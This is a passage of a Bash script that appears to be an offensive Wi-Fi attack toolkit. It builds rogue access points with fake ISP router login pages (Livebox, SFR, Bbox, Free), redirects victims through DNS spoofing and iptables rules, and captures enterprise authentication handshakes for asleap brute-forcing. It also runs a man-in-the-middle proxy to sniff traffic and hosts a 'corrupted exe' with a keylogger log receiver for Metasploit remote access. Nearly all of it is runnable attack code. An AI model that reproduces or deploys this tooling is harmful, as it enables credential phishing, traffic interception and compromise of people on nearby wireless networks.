      echo -e "\e[1;34m[*]\e[0m You choose your own file conf"
sleep 2;

unset passerelle
while [ -z "${passerelle}" ]; do read -p "Fake AP gateway: " passerelle;
if [[ ! ${passerelle} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ${passerelle}=; fi
done 


unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Which box you want to phish? (ex. livebox sfr bbox ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
        sleep 4;
f_confperso
fi
      
      echo -e "\e[1;34m[*]\e[0m Configuring network, wait..."
sleep 2;
        ifconfig ${monmode} ${passerelle} netmask 255.255.255.0
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net ${passerelle} netmask 255.255.255.0 gw ${passerelle}
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ${passerelle}
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to ${passerelle}:80
        echo > '/var/lib/dhcp/dhcpd.leases'
        echo 
        sudo sysctl net.ipv4.ip_forward=1
        echo -e "\e[1;34m[*]\e[0m Starting dhcp server"
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Starting apache and dnsspoof."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /root/dns.txt &> /dev/null &
       sudo chown -R root:www-data /var/www/*
        find /var/www -type d -exec sudo chmod 701 {} \;
        find /var/www -type f -exec sudo chmod 755 {} \;
        sudo service apache2 restart   
        sleep 4; 
        echo -e "\e[1;34m[*]\e[0m Starting hostapd..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
 echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
        echo $! >/tmp/hostapdclirefresh.pid
	f_mainmenu
}

##################################################

f_expert(){
clear
f_Banniere
echo "1.  Freeradius auth MD5"
echo "2.  Start asleap"
echo "3.  Previous menu"
echo "    Rogue AP detection bypass (not implemented yet)"
echo
read -p "Choix: " expertchoix

case ${expertchoix} in
1) f_hostapdfreeradius ;;
2) f_asleap ;;
3) f_mainmenu ;;
*) f_expert ;;
esac
}
##################################################

f_hostapdfreeradius(){
f_wlanhostapd

unset motdepasse
while [ -z ${motdepasse} ]; do
	read -p "Enter radius password, (you can enter anything): " motdepasse
done

cat <<-EOF > /etc/freeradius/clients.conf
	client localhost {
		ipaddr = 127.0.0.1
		secret = ${motdepasse}
		require_message_authenticator = no
		nastype = other
	}
	client 192.168.0.0/16 {
		secret = ${motdepasse}
		shortname = Entreprise
	}
	client 172.16.0.0/12 {
		secret = ${motdepasse}
		shortname = Entreprise
	}
	client 10.0.0.0/8 {
		secret = ${motdepasse}
		shortname = Entreprise
	}
EOF

unset ssid
while [ -z "${ESSID}" ]; do read -p "Essid name, LET A SPACE after the last letter: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"


unset canal
while [ -z "${canal}" ]; do read -p "Channel (must be different of real AP): " canal; done
if (($canal >= 1 && $canal <= 13)); then
        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_hostapdfreeradius
fi

cat <<-EOF > /root/hostapd.conf
interface=${interface}
driver=nl80211
ssid=${ESSID} 
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=${motdepasse}
wpa=1
hw_mode=g
channel=${canal}
wpa_pairwise=TKIP CCMP
wpa_key_mgmt=WPA-EAP
EOF

        echo -e "\e[1;34m[*]\e[0m Starting hostapd and freeradius server..."

xterm -hold -bg '#000000' -fg '#3A94FF' -e sudo /etc/init.d/freeradius start &> /dev/null &
sleep 3;
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
        echo -e "\e[1;34m[*]\e[0m Starting wireshark to get the challenge/answer..."
wireshark
sleep 10;
	f_mainmenu
}

##################################################

f_asleap(){
unset fichiercap
while [ -z "${fichiercap}" ]; do read -p "Name of your cap file: " fichiercap; done
        echo -e "\e[1;34m[*]\e[0m OK"
sleep 2;

unset dico
while [ -z "${dico}" ]; do read -p "Bruteforce dico name: " dico; done
        echo -e "\e[1;34m[*]\e[0m OK, starting the bruteforce..."
sleep 3;
xterm -hold -bg '#000000' -fg '#3A94FF' -e asleap -r ${fichiercap}-01.cap -f ${dico}.txt &> /dev/null &
sleep 2:
	f_mainmenu
}

##################################################

f_scan(){
        echo -e "\e[1;34m[*]\e[0m OK, stopping not necessary process... WAIT"
        sleep 4;
if [ -f "/usr/share/doc/network-manager/examples/server.conf" ];then
        systemctl stop NetworkManager.service
        systemctl disable NetworkManager.service
        sleep 4;
else
        service wicd stop
        sleep 5;
fi
f_wlan
        echo -e "\e[1;34m[*]\e[0m OK, starting airodump-ng, push ctrl+c to come back at the mainmenu"
sleep 5;
airodump-ng ${moniteurmode}
airmon-ng stop ${moniteurmode}
sleep 5;
ifconfig ${monmode} up
	f_mainmenu
}


##################################################

f_stop(){
           echo -e "\e[1;34m[*]\e[0m Restarting your wirelesse card as default mode and clean up your files..."
sleep 2;
airmon-ng stop ${intmoniteur}
sleep 5;
airmon-ng stop ${moniteurmode}
sleep 5;
ifconfig ${monmode} up

        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        kill `cat /tmp/hostapdclirefresh.pid`
        killall dnsspoof
        cd /tmp/
        rm -rf *.pid
        rm -rf *.txt
        rm -rf /root/hostapd.psk
        rm -rf /root/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attack stopped...\n"
        sleep 2;
        f_mainmenu
        else
        killall xterm
        echo -e "\n\e[1;34m[*]\e[0m Attack stopped...\n"
        sleep 2;
	f_mainmenu
fi
}


##################################################

f_switch(){
killall dhcpd
killall dnsspoof
unset passerelle
while [ -z "${passerelle}" ]; do read -p "Enter the router gateway connected to the net: " passerelle;
if [[ ! ${passerelle} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ${passerelle}=; fi
done

ifconfig -a
unset ethmode
while [ -z "${ethmode}" ]; do read -p "Interface connected to the network (ex. eth0 en***...): " ethmode; done
if echo ${ethmode} | egrep '^eth*|en*'  ; then
        dhclient ${ethmode}
        sleep 3;
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_switch
fi

ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card in use for the fake AP (ex. wlan* wlp*** or at0 if you are using airbase): " monmode; done
if echo ${monmode} | egrep '^at*|wlan*|wlp*'  ; then
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
sudo sysctl net.ipv4.ip_forward=0
sleep 2;
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 8.8.8.8;
allow unknown-clients;
}
EOF
sleep 1;   
             echo > '/var/lib/dhcp/dhcpd.leases'
         echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;  
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig ${monmode} 10.0.0.1 netmask 255.255.255.0
         sleep 1;
         iptables -F
         iptables -X
         iptables -t nat -F
         iptables -t nat -X
         sleep 2;
         iptables --table nat --append POSTROUTING --out-interface ${ethmode} -j MASQUERADE
         iptables --append FORWARD --in-interface ${monmode} -j ACCEPT
         iptables -t nat -A PREROUTING -p udp -j DNAT --to ${passerelle}
         iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:10000 &> /dev/null
         iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:10000
         sleep 2;
         xterm -hold -bg '#000000' -fg '#3A94FF' -e sergio-proxy-master -l 10000 -w /tmp/sergio-log.txt &> /dev/null &
        sleep 3;
        f_mainmenu
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 3;
f_switch
fi
}


##################################################

f_keycheck(){
nano /etc/wpa_supplicant.conf
f_mainmenu
}


##################################################

f_sergio(){
nano /tmp/sergio-log.txt
f_mainmenu
}


##################################################

f_clientside(){
                 echo -e "\e[1;34m[*]\e[0m To run this attack you need a corrupted exe file or whatever like that, so you can start metasploit on another terminal.Also this client side option use html file to phish the user on our apache server, check the paths of your both files (defaut corrupted file is in /etc and defaut html file in /var/www) change the paths of files on the script yourself if you are not happy with that"
           sleep 20;
unset fichiercorrompu
while [ -z "${fichiercorrompu}" ]; do read -p "Name of corrupt file to use: " fichiercorrompu; done
      mkdir /root/apachebackup2
      cp -R /var/www/* /root/apachebackup2/
        sleep 2;
      cd /var/www/
      rm -rf *
      cp -R /etc/${fichiercorrompu} /var/www/
        sleep 2;
unset fichierhtml
while [ -z "${fichierhtml}" ]; do read -p "Name of html file to use: " fichierhtml; done
      cp -R /etc/${fichierhtml} /var/www/
      sleep 1;
      sudo chown -R root:www-data /var/www/*
      find /var/www -type f -exec sudo chmod 777 {} \;
      sleep 2;
      mkdir /var/www/testkeylog
      cd /var/www/testkeylog
      touch receiver.php              # do whatever you want with this
      touch logs.txt
      sudo chown -R root:www-data /var/www/testkeylog/*
      find /var/www/testkeylog -type f -exec sudo chmod 777 {} \;
      sleep 2;
      sudo chown -R root:www-data /var/www/testkeylog/logs.txt
      sudo chmod 764 /var/www/testkeylog/logs.txt
      sleep 1;
      sudo service apache2 restart    
        sleep 4;
      echo -e "\e[1;34m[*]\e[0m OK all files and rules has been configured"
      sleep 2;
      f_mainmenu
}


##################################################

f_mainmenu(){
clear
f_Banniere
echo "1.  File configuration"
echo "2.  Fake AP attack"
echo "3.  Ddos attack"
echo "4.  Mode expert"
echo "5.  Passif scan (start it in full screen mode)"
echo "6.  Stop alive attack (if there one)"
echo "7.  Switch to connected rogue AP and sniff trafic (will not work with hsts on modern web browser)"
echo "8.  See the wifi key grabed during attack"
echo "9.  See the dump file of sergio-proxy if you used connected rogue AP switch"
echo "10. Client side attack and remote access"
echo "11. Quit"
echo
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_config ;;
2) unset clean; f_rogueap ;;
3) unset clean; f_ddos ;;
4) unset clean; f_expert ;;
5) unset clean; f_scan ;;
6) unset clean; f_stop ;;
7) unset clean; f_switch ;;
8) unset clean; f_keycheck ;;
9) unset clean; f_sergio ;;
10) unset clean; f_clientside ;;
11) f_checkexit ;;
*) f_mainmenu ;;
esac
}

# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!]\e[0m Sorry but this script need admin session" 1>&2
	exit 1
else
	clean=1
	f_mainmenu
fi
